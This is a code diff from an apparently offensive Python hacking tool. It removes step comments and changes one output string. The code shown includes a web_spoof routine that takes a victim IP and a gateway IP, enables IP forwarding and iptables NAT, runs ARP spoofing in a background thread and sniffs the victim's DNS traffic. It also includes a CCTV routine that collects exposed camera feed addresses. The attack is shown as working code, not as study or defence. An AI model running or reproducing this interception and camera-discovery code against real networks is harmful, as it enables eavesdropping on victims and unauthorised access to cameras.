@@ -429,20 +429,15 @@ def web_spoof():
     victim_ip = input(f"{Fore.YELLOW}Victim IP > {Style.RESET_ALL}")
     gateway_ip = input(f"{Fore.YELLOW}Gateway IP > {Style.RESET_ALL}")
 
-    # 1. Abilita promiscua
     enable_promiscuous(iface)
 
-    # 2. Abilita IP forwarding
     os.system("sudo sysctl -w net.ipv4.ip_forward=1")
 
-    # 3. IPTABLES NAT
     os.system(f"sudo iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
 
-    # 4. Avvia ARP spoof in background
     spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, iface), daemon=True)
     spoof_thread.start()
 
-    # 5. Sniffing
     print(f"{Fore.CYAN}\n[*] Sniffing DNS traffic from {victim_ip} on {iface}... Press Ctrl+C to stop.{Style.RESET_ALL}")
     try:
         dns_sniffer(iface, victim_ip)
@@ -560,7 +555,7 @@ def CCTV():
                 )
                 find_ip = re.findall(r"http://\d+\.\d+\.\d+\.\d+:\d+", res.text)
                 for ip in find_ip:
-                    print(f"\033[1;31m[+] Found feed: {ip}\033[0m")
+                    print(f"\033[1;31m[+] Found cam: {ip}\033[0m")
                     f.write(f'{ip}\n')
                     time.sleep(0.05)
 
